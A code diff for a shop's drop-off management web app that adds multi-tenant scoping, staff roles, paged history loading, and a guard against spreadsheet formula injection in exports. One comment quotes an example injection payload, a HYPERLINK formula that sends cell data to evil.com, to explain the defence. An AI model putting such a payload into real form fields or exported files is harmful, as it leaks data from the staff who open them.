@@ -2421,6 +2421,10 @@ const sb = supabase.createClient(CFG.SUPABASE_URL, CFG.SUPABASE_ANON_KEY, {
 //  State
 // ============================================================
 let me = null;                 // current user
+let currentTenantId = null;    // which shop this session is working in
+let currentTenantSlug = null;
+let myRole = null;             // 'owner' | 'manager' | 'staff'
+const isAdmin = () => myRole === 'owner' || myRole === 'manager';
 let dropoffs = [];             // all dropoffs
 let customers = [];            // all customers
 let currentDropoffId = null;
@@ -2451,6 +2455,22 @@ const SPECIAL_TIERS = ['Custom Price','DO NOT BUY','Very Best'];
 const $ = id => document.getElementById(id);
 const esc = s => String(s||'').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 const fmt$ = n => '$' + Number(n||0).toFixed(2);
+
+// ── Spreadsheet formula-injection guard (CWE-1236) ──────────
+// Customer names, bag descriptions and notes arrive from a PUBLIC form,
+// then get exported to CSV/XLSX and opened by staff in Excel or Sheets.
+// A value starting with = + - @ (or a control char) is interpreted as a
+// FORMULA by those apps, so a name like:
+//     =HYPERLINK("http://evil.com?d="&A1,"Click me")
+// would execute on the staff member's machine. Prefixing with an
+// apostrophe forces the app to treat it as literal text. Numbers and
+// non-strings pass through untouched so real figures still calculate.
+function safeCell(v) {
+  if (v == null) return v;
+  if (typeof v === 'number' || typeof v === 'boolean') return v;
+  const s = String(v);
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
 // Round to whole cents before persisting money — raw float math (e.g.
 // resale * 0.30) would otherwise store values like 12.600000000000001.
 const cents = n => Math.round((Number(n) || 0) * 100) / 100;
@@ -2506,6 +2526,20 @@ async function checkSession() {
   if (!session) { $('loginView').style.display = 'flex'; return; }
   me = session.user;
   $('navEmail').textContent = me.email;
+
+  // Which shop does this login belong to? Everything below is scoped to it.
+  const { data: tenants, error: tErr } = await sb.rpc('my_tenants');
+  if (tErr) throw new Error('Could not load your shop: ' + tErr.message);
+  if (!tenants || !tenants.length) {
+    // Signed in but no shop yet — send them through setup.
+    window.location.href = 'signup.html';
+    return;
+  }
+  currentTenantId = tenants[0].tenant_id;
+  currentTenantSlug = tenants[0].slug;
+  myRole = tenants[0].role;
+  if (!tenants[0].onboarded_at) { window.location.href = 'signup.html'; return; }
+
   $('appView').style.display = 'block';
   await initApp();
 }
@@ -2536,6 +2570,12 @@ async function doLogout() {
 //  Init
 // ============================================================
 async function initApp() {
+  // Only owners/managers can change pricing, rules, and settings — the
+  // database enforces this, but hide the buttons from staff too so they
+  // don't open an editor that would just error when they try to save.
+  if (!isAdmin()) {
+    ['navPricing','navRules','navSettings'].forEach(id => { const b = $(id); if (b) b.style.display = 'none'; });
+  }
   await Promise.all([loadPricingConfig(), loadSettings()]);
   await Promise.all([loadDropoffs(), loadCustomers()]);
   document.addEventListener('click', (e) => {
@@ -2567,7 +2607,7 @@ async function initApp() {
 }
 
 async function loadPricingConfig() {
-  const { data, error } = await sb.from('pricing_config').select('data').eq('id', 1).single();
+  const { data, error } = await sb.from('pricing_config').select('data').eq('tenant_id', currentTenantId).single();
   // Pricing config is required for the app to work — fail loudly, not silently.
   if (error) throw new Error('Could not load pricing config: ' + error.message);
   if (data) {
@@ -2579,21 +2619,119 @@ async function loadPricingConfig() {
 }
 
 async function loadSettings() {
-  const { data, error } = await sb.from('settings').select('*').eq('id', 1).single();
+  const { data, error } = await sb.from('settings').select('*').eq('tenant_id', currentTenantId).single();
   // Settings are required for the app to work — fail loudly, not silently.
   if (error) throw new Error('Could not load settings: ' + error.message);
   if (data) settings = data;
   invalidatePricingConfig();
 }
 
-async function loadDropoffs() {
-  const { data, error } = await sb.from('dropoffs')
+// ============================================================
+//  Drop-off loading
+//
+//  The old code re-downloaded EVERY drop-off (full item lists +
+//  customer records) on every page load and again after every single
+//  action — ~10 MB per load after a year at 10 drop-offs/day, and
+//  growing daily. It also silently capped at 1000 rows (Supabase's
+//  per-request limit), so older data would just vanish from view.
+//
+//  New model:
+//   - Boot loads the WORKING SET: all unresolved drop-offs, plus
+//     resolved ones dropped within RECENT_DAYS. Small forever.
+//   - Older resolved history loads once per session, on demand, only
+//     when a view that needs it opens (spreadsheet, customers,
+//     insights) — paged in 1000-row chunks so nothing is truncated.
+//   - After an action, only the ONE changed record is refetched
+//     (refreshDropoff), not the whole table.
+// ============================================================
+const RECENT_DAYS = 90;
+let historyLoaded = false;
+let _historyPromise = null;
+
+function dropoffQuery() {
+  return sb.from('dropoffs')
     .select('*, customer:customers(*)')
     .is('deleted_at', null)
     .neq('stage', 'cancelled')
     .order('dropped_at', { ascending: false });
-  if (error) { toast('Load failed: ' + error.message); return; }
-  dropoffs = data || [];
+}
+
+// Page through results — Supabase returns at most 1000 rows per request.
+async function fetchAllPages(buildQuery) {
+  const PAGE = 1000;
+  let from = 0, out = [];
+  for (;;) {
+    const { data, error } = await buildQuery().range(from, from + PAGE - 1);
+    if (error) throw new Error(error.message);
+    out = out.concat(data || []);
+    if (!data || data.length < PAGE) return out;
+    from += PAGE;
+  }
+}
+
+function recentCutoffISO() {
+  return new Date(Date.now() - RECENT_DAYS * 86400000).toISOString();
+}
+
+const byDroppedDesc = (a, b) => new Date(b.dropped_at) - new Date(a.dropped_at);
+
+async function loadDropoffs() {
+  try {
+    if (historyLoaded) {
+      // Session already expanded to full history — keep it complete.
+      dropoffs = await fetchAllPages(() => dropoffQuery());
+    } else {
+      const cutoff = recentCutoffISO();
+      const [active, recentResolved] = await Promise.all([
+        fetchAllPages(() => dropoffQuery().neq('stage', 'resolved')),
+        fetchAllPages(() => dropoffQuery().eq('stage', 'resolved').gte('dropped_at', cutoff)),
+      ]);
+      dropoffs = active.concat(recentResolved).sort(byDroppedDesc);
+    }
+  } catch (e) { toast('Load failed: ' + e.message); return; }
+  renderDashView();
+  renderStatPills();
+}
+
+// Pull older resolved history into memory, once per session, for the
+// views that genuinely need all of it. Concurrent callers share one fetch.
+function ensureFullHistory() {
+  if (historyLoaded) return Promise.resolve();
+  if (_historyPromise) return _historyPromise;
+  toast('Loading older history…');
+  _historyPromise = (async () => {
+    const older = await fetchAllPages(() =>
+      dropoffQuery().eq('stage', 'resolved').lt('dropped_at', recentCutoffISO()));
+    const seen = new Set(dropoffs.map(d => d.id));
+    for (const d of older) if (!seen.has(d.id)) dropoffs.push(d);
+    dropoffs.sort(byDroppedDesc);
+    historyLoaded = true;
+  })().catch(e => {
+    _historyPromise = null;   // allow retry on next attempt
+    toast('Could not load history: ' + e.message);
+  });
+  return _historyPromise;
+}
+
+// Refetch ONE drop-off after an action and merge it into the local list.
+// This replaces the old "reload everything" pattern after every mutation.
+async function refreshDropoff(id) {
+  if (!id) return loadDropoffs();
+  const { data, error } = await sb.from('dropoffs')
+    .select('*, customer:customers(*)')
+    .eq('id', id)
+    .maybeSingle();
+  if (error) { toast('Refresh failed: ' + error.message); return; }
+  const idx = dropoffs.findIndex(d => d.id === id);
+  const gone = !data || data.deleted_at || data.stage === 'cancelled';
+  if (gone) {
+    if (idx >= 0) dropoffs.splice(idx, 1);
+  } else if (idx >= 0) {
+    dropoffs[idx] = data;
+  } else {
+    dropoffs.push(data);
+    dropoffs.sort(byDroppedDesc);
+  }
   renderDashView();
   renderStatPills();
 }
@@ -2621,11 +2759,23 @@ function showView(v) {
   if (v !== 'pricing' && v !== 'settings' && v !== 'rules' && adminUnlocked) {
     adminUnlocked = false;
   }
-  if (v === 'customers') renderCustomers();
+  if (v === 'customers') {
+    renderCustomers();
+    // Customer stats need full history — load it once, then re-render
+    // if the user is still on this view.
+    ensureFullHistory().then(() => {
+      if ($('customersView').style.display !== 'none') renderCustomers();
+    });
+  }
   if (v === 'pricing') renderPricingAdmin();
   if (v === 'settings') renderSettings();
   if (v === 'rules') renderRules();
-  if (v === 'insights') renderInsights();
+  if (v === 'insights') {
+    renderInsights();
+    ensureFullHistory().then(() => {
+      if ($('insightsView').style.display !== 'none') renderInsights();
+    });
+  }
 }
 
 // ============================================================
@@ -2720,6 +2870,13 @@ function setDashView(mode) {
   $('kanban').style.display = (mode === 'kanban') ? 'grid' : 'none';
   $('sheetView').style.display = (mode === 'sheet') ? 'block' : 'none';
   renderDashView();
+  // The spreadsheet view spans all history — load the rest once, then
+  // re-render if the user is still looking at it.
+  if (mode === 'sheet') {
+    ensureFullHistory().then(() => {
+      if (dashViewMode === 'sheet') renderDashView();
+    });
+  }
 }
 
 function renderDashView() {
@@ -2795,7 +2952,7 @@ function exportDropoffToExcel(dropoffId) {
   }
 
   // Build workbook
-  const ws = XLSX.utils.aoa_to_sheet(rows);
+  const ws = XLSX.utils.aoa_to_sheet(rows.map(r => Array.isArray(r) ? r.map(safeCell) : r));
   // Column widths for readability
   ws['!cols'] = [
     {wch:12},                                                  // Drop-off ID
@@ -3305,6 +3462,13 @@ function copyIntakeLink() {
 function openDropoff(id) {
   currentDropoffId = id;
   showView('detail');
+  // With scoped loading, an old drop-off (e.g. opened from history) may not
+  // be in memory yet — fetch it on demand.
+  if (!getDropoff(id)) {
+    $('detailBody').innerHTML = '<div class="empty">Loading…</div>';
+    refreshDropoff(id).then(renderDetail);
+    return;
+  }
   renderDetail();
 }
 
@@ -3725,7 +3889,7 @@ async function saveBulkAndAdvance() {
   }).eq('id', currentDropoffId);
   if (error) { toast('Error: ' + error.message); return; }
   await logActivity('priced', { items, onesies, total });
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
   renderDetail();
   toast('Bulk priced — ready to send offer');
 }
@@ -3739,7 +3903,7 @@ async function advance(toStage) {
   const { error } = await sb.from('dropoffs').update(update).eq('id', currentDropoffId);
   if (error) { toast(error.message); return; }
   await logActivity('advanced', { to: toStage });
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
   renderDetail();
 }
 
@@ -3777,7 +3941,7 @@ async function submitItemCount() {
   if (error) { toast(error.message); return; }
   await logActivity('tagged', { item_count: itemCount });
   closeItemCountModal();
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
   renderDetail();
 }
 
@@ -3800,7 +3964,7 @@ async function finishPricing() {
   }).eq('id', currentDropoffId);
   if (error) { toast(error.message); return; }
   await logActivity('priced', { cash, credit });
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
   // Open the review overlay (stage still 'pricing')
   openReviewOverlay();
 }
@@ -3936,7 +4100,7 @@ async function reviewRemoveLine(i) {
   const current = fresh.pricing_lines || [];
   if (JSON.stringify(cached) !== JSON.stringify(current)) {
     toast('This bag was changed by someone else — list refreshed, please try again.');
-    await loadDropoffs(); renderReviewOverlay(); return;
+    await refreshDropoff(currentDropoffId); renderReviewOverlay(); return;
   }
   const lines = current.slice();
   lines.splice(i, 1);
@@ -3950,7 +4114,7 @@ async function reviewRemoveLine(i) {
     credit_amount: credit,
   }).eq('id', currentDropoffId);
   if (error) { toast(error.message); return; }
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
   renderReviewOverlay();
 }
 
@@ -3994,7 +4158,7 @@ async function markPaid() {
   const { error } = await sb.from('dropoffs').update(update).eq('id', currentDropoffId);
   if (error) { toast(error.message); return; }
   await logActivity(wantsPickup ? 'paid_awaiting_pickup' : 'paid_and_resolved');
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
   renderDetail();
   toast(wantsPickup ? 'Paid — now awaiting pickup' : 'Paid and resolved');
 }
@@ -4010,7 +4174,7 @@ async function markPickedUp() {
   }).eq('id', currentDropoffId);
   if (error) { toast(error.message); return; }
   await logActivity('picked_up');
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
   renderDetail();
   toast('Picked up — resolved');
 }
@@ -4029,7 +4193,7 @@ async function markPickupDonated() {
   }).eq('id', currentDropoffId);
   if (error) { toast(error.message); return; }
   await logActivity('pickup_donated', { reason: 'customer_no_show' });
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
   renderDetail();
   toast('Leftovers donated — resolved');
 }
@@ -4174,7 +4338,7 @@ async function submitOverride() {
     overridden_by: me.email
   });
   closeOverrideModal();
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
   await loadCustomers();
   renderDetail();
   toast('Manual resolution saved');
@@ -4283,6 +4447,7 @@ async function submitWalkIn() {
   } else {
     // Create new customer
     const newCust = {
+      tenant_id: currentTenantId,
       name,
       email: email || null,
       phone: phone || null,
@@ -4304,6 +4469,7 @@ async function submitWalkIn() {
   const targetStage = (leftover === 'pickup') ? 'awaiting_pickup' : 'resolved';
 
   const dropoff = {
+    tenant_id: currentTenantId,
     customer_id: customerId,
     drop_type: dropType,
     bag_description: bag || null,
@@ -4332,6 +4498,7 @@ async function submitWalkIn() {
   if (derr) { err.textContent = 'Could not save drop-off: ' + derr.message; err.style.display = 'block'; return; }
 
   await sb.from('activity_log').insert({
+    tenant_id: currentTenantId,
     dropoff_id: dropResult.id,
     actor: me.email,
     action: 'walk_in_created',
@@ -4339,7 +4506,7 @@ async function submitWalkIn() {
   });
 
   closeWalkInModal();
-  await loadDropoffs();
+  await refreshDropoff(dropResult.id);
   await loadCustomers();
   toast(`Walk-in drop-off for ${name} saved — ${fmt$(amount)} ${payment === 'credit' ? 'credit' : payment === 'cash' ? 'cash' : 'no payment'}`, { durationMs: 4500 });
 }
@@ -4356,7 +4523,7 @@ async function reopenDropoff() {
     picked_up_by: null
   }).eq('id', currentDropoffId);
   if (error) { toast(error.message); return; }
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
   renderDetail();
 }
 
@@ -4408,6 +4575,7 @@ async function confirmDeleteDropoff() {
 
   // Audit trail — record who deleted it (independent of recoverability)
   await sb.from('activity_log').insert({
+    tenant_id: currentTenantId,
     dropoff_id: deletedId,
     actor: me.email,
     action: 'deleted',
@@ -4417,7 +4585,7 @@ async function confirmDeleteDropoff() {
   closeDeleteDropoffModal();
   // Go back to the dashboard so the user sees the card is gone
   showView('dash');
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
 
   // Undo toast — 8 seconds, restores the dropoff if clicked
   toast(`Deleted ${d.customer?.name || 'drop-off'}'s drop-off.`, {
@@ -4434,12 +4602,13 @@ async function undoDeleteDropoff(id) {
   }).eq('id', id);
   if (error) { toast('Could not undo: ' + error.message); return; }
   await sb.from('activity_log').insert({
+    tenant_id: currentTenantId,
     dropoff_id: id,
     actor: me.email,
     action: 'restored',
     details: null
   });
-  await loadDropoffs();
+  await refreshDropoff(id);
   toast('Drop-off restored.');
 }
 
@@ -4447,7 +4616,7 @@ async function saveNotes() {
   const notes = $('notesField').value;
   const { error } = await sb.from('dropoffs').update({ notes }).eq('id', currentDropoffId);
   if (error) { toast(error.message); return; }
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
   toast('Notes saved');
 }
 
@@ -4456,13 +4625,14 @@ async function saveBagDescription() {
   const { error } = await sb.from('dropoffs').update({ bag_description: bag }).eq('id', currentDropoffId);
   if (error) { toast(error.message); return; }
   await logActivity('bag_described', { bag });
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
   renderDetail();
   toast('Bag description saved');
 }
 
 async function logActivity(action, details) {
   await sb.from('activity_log').insert({
+    tenant_id: currentTenantId,
     dropoff_id: currentDropoffId,
     actor: me.email,
     action,
@@ -4853,12 +5023,12 @@ async function addLine() {
   if (freshErr) { toast('Could not save — ' + freshErr.message); return; }
   if (fresh.stage !== 'pricing') {
     toast('Items are locked once the drop-off leaves Pricing.');
-    await loadDropoffs(); renderDetail(); return;
+    await refreshDropoff(currentDropoffId); renderDetail(); return;
   }
   const lines = (fresh.pricing_lines || []).concat([line]);
   const { error } = await sb.from('dropoffs').update({ pricing_lines: lines }).eq('id', currentDropoffId);
   if (error) { toast(error.message); return; }
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
   renderDetail();
   initPricingTool(getDropoff(currentDropoffId));
 }
@@ -4891,7 +5061,7 @@ async function removeLine(i) {
   if (freshErr) { toast('Could not save — ' + freshErr.message); return; }
   if (fresh.stage !== 'pricing') {
     toast('Items are locked once the drop-off leaves Pricing.');
-    await loadDropoffs(); renderDetail(); return;
+    await refreshDropoff(currentDropoffId); renderDetail(); return;
   }
   const cached = d.pricing_lines || [];
   const current = fresh.pricing_lines || [];
@@ -4899,13 +5069,13 @@ async function removeLine(i) {
     // Someone else changed this bag since we loaded it — the row index may
     // point at the wrong item now. Refresh instead of guessing.
     toast('This bag was changed by someone else — list refreshed, please try again.');
-    await loadDropoffs(); renderDetail(); return;
+    await refreshDropoff(currentDropoffId); renderDetail(); return;
   }
   const lines = current.slice();
   lines.splice(i, 1);
   const { error } = await sb.from('dropoffs').update({ pricing_lines: lines }).eq('id', currentDropoffId);
   if (error) { toast(error.message); return; }
-  await loadDropoffs();
+  await refreshDropoff(currentDropoffId);
   renderDetail();
 }
 
@@ -4928,7 +5098,7 @@ async function openOfferModal() {
     }).eq('id', currentDropoffId);
     if (error) { toast(error.message); return; }
     await logActivity('offer_prepared', { token });
-    await loadDropoffs();
+    await refreshDropoff(currentDropoffId);
   }
 
   const link = `${CFG.PUBLIC_BASE_URL.replace(/\/$/,'')}/offer.html?t=${token}`;
@@ -5084,7 +5254,7 @@ async function markOfferSentFromModal() {
     const { error } = await sb.from('dropoffs').update(update).eq('id', currentDropoffId);
     if (error) { toast(error.message); return; }
     await logActivity('offer_sent', {});
-    await loadDropoffs();
+    await refreshDropoff(currentDropoffId);
   }
   closeOfferModal();
   // If the review overlay is open behind it, close that too — the workflow is done.
@@ -5223,6 +5393,13 @@ function openCustomerDetail(id) {
   currentCustomerId = id;
   showView('customerDetail');
   renderCustomerDetail();
+  // A customer's drop history spans all time — make sure it's all loaded,
+  // then re-render if the user is still on this page.
+  ensureFullHistory().then(() => {
+    if ($('customerDetailView').style.display !== 'none' && currentCustomerId === id) {
+      renderCustomerDetail();
+    }
+  });
 }
 
 function renderCustomerDetail() {
@@ -5730,7 +5907,9 @@ function renderInsights() {
   }
 }
 
-function exportInsightsCSV() {
+async function exportInsightsCSV() {
+  // The export window can reach past the eagerly-loaded range.
+  await ensureFullHistory();
   const { from, to } = insightDateWindow();
   const windowDrops = dropsInWindow(from, to);
   const sum = (arr, fn) => arr.reduce((a, x) => a + (fn(x) || 0), 0);
@@ -5804,7 +5983,7 @@ async function saveSettings() {
     bulk_onesie_price: Number($('setBulkOnesie').value) || 0.25,
     auto_donate_days: Number($('setAutoDonate').value) || 7
   };
-  const { error } = await sb.from('settings').update(update).eq('id', 1);
+  const { error } = await sb.from('settings').update(update).eq('tenant_id', currentTenantId);
   if (error) { toast(error.message); return; }
   settings = { ...settings, ...update };
   toast('Settings saved');
@@ -5819,7 +5998,7 @@ async function saveBehavior() {
     baby_carrier_divisor: Number($('setBabyCarrierDivisor').value) || 3.00,
     hat_flat_price: Number($('setHatFlatPrice').value) || 5.00,
   };
-  const { error } = await sb.from('settings').update(update).eq('id', 1);
+  const { error } = await sb.from('settings').update(update).eq('tenant_id', currentTenantId);
   if (error) { toast(error.message); return; }
   settings = { ...settings, ...update };
   toast('Behavior settings saved');
@@ -6025,7 +6204,7 @@ async function submitBrandRule() {
     rules.brand_rules.push(ruleObj);
   }
 
-  const { error } = await sb.from('settings').update({ business_rules: rules }).eq('id', 1);
+  const { error } = await sb.from('settings').update({ business_rules: rules }).eq('tenant_id', currentTenantId);
   if (error) { err.textContent = error.message; err.style.display = 'block'; return; }
   settings.business_rules = rules;
   closeBrandRuleModal();
@@ -6037,7 +6216,7 @@ async function removeBrandRule(idx) {
   if (!confirm('Delete this brand rule?')) return;
   const rules = JSON.parse(JSON.stringify(getBusinessRules()));
   (rules.brand_rules || []).splice(idx, 1);
-  const { error } = await sb.from('settings').update({ business_rules: rules }).eq('id', 1);
+  const { error } = await sb.from('settings').update({ business_rules: rules }).eq('tenant_id', currentTenantId);
   if (error) { toast(error.message); return; }
   settings.business_rules = rules;
   toast('Brand rule deleted');
@@ -6102,7 +6281,7 @@ async function submitTypeBehavior() {
   // If renaming wasn't allowed via disabled input, this still works as create-or-update
   rules.type_behaviors[type] = { kind, note };
 
-  const { error } = await sb.from('settings').update({ business_rules: rules }).eq('id', 1);
+  const { error } = await sb.from('settings').update({ business_rules: rules }).eq('tenant_id', currentTenantId);
   if (error) { err.textContent = error.message; err.style.display = 'block'; return; }
   settings.business_rules = rules;
   closeTypeBehaviorModal();
@@ -6114,7 +6293,7 @@ async function removeTypeBehavior(type) {
   if (!confirm(`Delete the special behavior for "${type}"? Pricing will revert to standard matrix lookup.`)) return;
   const rules = JSON.parse(JSON.stringify(getBusinessRules()));
   delete (rules.type_behaviors || {})[type];
-  const { error } = await sb.from('settings').update({ business_rules: rules }).eq('id', 1);
+  const { error } = await sb.from('settings').update({ business_rules: rules }).eq('tenant_id', currentTenantId);
   if (error) { toast(error.message); return; }
   settings.business_rules = rules;
   toast('Type behavior deleted');
@@ -6133,7 +6312,7 @@ async function addShoeType() {
     return;
   }
   rules.shoe_types.push(norm);
-  const { error } = await sb.from('settings').update({ business_rules: rules }).eq('id', 1);
+  const { error } = await sb.from('settings').update({ business_rules: rules }).eq('tenant_id', currentTenantId);
   if (error) { toast(error.message); return; }
   settings.business_rules = rules;
   toast('Shoe type added');
@@ -6144,7 +6323,7 @@ async function removeShoeType(name) {
   if (!confirm(`Remove "${name}" from the shoe condition list?`)) return;
   const rules = JSON.parse(JSON.stringify(getBusinessRules()));
   rules.shoe_types = (rules.shoe_types || []).filter(t => t !== name);
-  const { error } = await sb.from('settings').update({ business_rules: rules }).eq('id', 1);
+  const { error } = await sb.from('settings').update({ business_rules: rules }).eq('tenant_id', currentTenantId);
   if (error) { toast(error.message); return; }
   settings.business_rules = rules;
   toast('Removed');
@@ -6178,7 +6357,7 @@ async function submitDnbBrands() {
   const updated = JSON.parse(JSON.stringify(pricingData));
   for (const b of brands) updated.brands[b] = 'DO NOT BUY';
 
-  const { error } = await sb.from('pricing_config').update({ data: updated }).eq('id', 1);
+  const { error } = await sb.from('pricing_config').update({ data: updated }).eq('tenant_id', currentTenantId);
   if (error) { err.textContent = error.message; err.style.display = 'block'; return; }
   pricingData = updated;
   closeDnbModal();
@@ -6191,7 +6370,7 @@ async function removeFromDnb(brand) {
   const updated = JSON.parse(JSON.stringify(pricingData));
   // Default to "Good" tier on removal — staff can change in Pricing
   updated.brands[brand] = 'Good';
-  const { error } = await sb.from('pricing_config').update({ data: updated }).eq('id', 1);
+  const { error } = await sb.from('pricing_config').update({ data: updated }).eq('tenant_id', currentTenantId);
   if (error) { toast(error.message); return; }
   pricingData = updated;
   toast(`${brand} reset to Good tier — adjust in Pricing`);
@@ -6387,7 +6566,7 @@ async function submitSetPw() {
     err.textContent = 'Passwords do not match.'; err.style.display = 'block'; return;
   }
   const hash = await hashPassword(newPw);
-  const { error } = await sb.from('settings').update({ admin_password_hash: hash }).eq('id', 1);
+  const { error } = await sb.from('settings').update({ admin_password_hash: hash }).eq('tenant_id', currentTenantId);
   if (error) { err.textContent = error.message; err.style.display = 'block'; return; }
   settings.admin_password_hash = hash;
   adminUnlocked = true;  // user just set it, give them edit access this session
@@ -6406,7 +6585,7 @@ async function clearAdminPw() {
     $('setPwErr').style.display = 'block';
     return;
   }
-  const { error } = await sb.from('settings').update({ admin_password_hash: null }).eq('id', 1);
+  const { error } = await sb.from('settings').update({ admin_password_hash: null }).eq('tenant_id', currentTenantId);
   if (error) { toast(error.message); return; }
   settings.admin_password_hash = null;
   adminUnlocked = false;
@@ -6662,7 +6841,7 @@ async function savePricingConfig() {
     data: pricingData,
     updated_at: new Date().toISOString(),
     updated_by: me.email
-  }).eq('id', 1);
+  }).eq('tenant_id', currentTenantId);
   if (error) { toast(error.message); return; }
   toast('Pricing config saved');
 }
@@ -6685,7 +6864,9 @@ function ymd(d) {
   return d.getFullYear() + '-' + z(d.getMonth() + 1) + '-' + z(d.getDate());
 }
 
-function exportPreset(preset) {
+async function exportPreset(preset) {
+  // Exports can span any date range — make sure all history is in memory first.
+  await ensureFullHistory();
   const now = new Date();
   let from, to;
   if (preset === 'this_month') {
@@ -6772,7 +6953,7 @@ async function previewExport() {
 
 function csvCell(v) {
   if (v == null) return '';
-  let s = String(v);
+  let s = String(safeCell(v));
   // RFC 4180: quote if contains comma, quote, or newline. Double internal quotes.
   if (/[",\r\n]/.test(s)) {
     s = '"' + s.replace(/"/g, '""') + '"';
@@ -6990,7 +7171,7 @@ function downloadImportTemplate() {
 
   // Sheet 1: Drop-Offs template
   const rows = [IMPORT_COLUMNS, EXAMPLE_ROW];
-  const ws = XLSX.utils.aoa_to_sheet(rows);
+  const ws = XLSX.utils.aoa_to_sheet(rows.map(r => Array.isArray(r) ? r.map(safeCell) : r));
   // Set column widths
   ws['!cols'] = [
     {wch:12},{wch:22},{wch:26},{wch:16},{wch:11},{wch:30},
@@ -7040,7 +7221,7 @@ function downloadImportTemplate() {
     ['Customers are deduplicated by email (case-insensitive), falling back to phone.'],
     ['If a customer already exists, the drop-off attaches to them and increments their drop count.']
   ];
-  const ws2 = XLSX.utils.aoa_to_sheet(instructions);
+  const ws2 = XLSX.utils.aoa_to_sheet(instructions.map(r => Array.isArray(r) ? r.map(safeCell) : r));
   ws2['!cols'] = [{wch:22},{wch:14},{wch:42},{wch:50}];
   XLSX.utils.book_append_sheet(wb, ws2, 'Instructions');
 
@@ -7460,7 +7641,7 @@ async function commitImport() {
     const newIds = new Array(newCustomers.length);
     const CHUNK = 200;
     for (let i = 0; i < newCustomers.length; i += CHUNK) {
-      const chunk = newCustomers.slice(i, i + CHUNK);
+      const chunk = newCustomers.slice(i, i + CHUNK).map(c => ({ ...c, tenant_id: currentTenantId }));
       const { data, error } = await sb.from('customers').insert(chunk).select('id');
       if (error) throw error;
       for (let j = 0; j < data.length; j++) newIds[i + j] = data[j].id;
@@ -7474,7 +7655,7 @@ async function commitImport() {
       const asn = rowAssignments[i];
       const cid = asn.existingId || newIds[asn.newIdx];
       if (!cid) continue;
-      dropoffs.push({ ...m.dropoff, customer_id: cid });
+      dropoffs.push({ ...m.dropoff, tenant_id: currentTenantId, customer_id: cid });
     }
 
     // Step E: Insert dropoffs in chunks
@@ -7497,7 +7678,10 @@ async function commitImport() {
       <em style="font-size:12px;color:#888">Refresh the dashboard to see your imported data.</em>
     `;
 
-    // Refresh data in the background
+    // Imported rows may be historical — force the next history-needing
+    // view to refetch, then refresh the working set in the background.
+    historyLoaded = false;
+    _historyPromise = null;
     loadDropoffs();
     loadCustomers();
   } catch (err) {
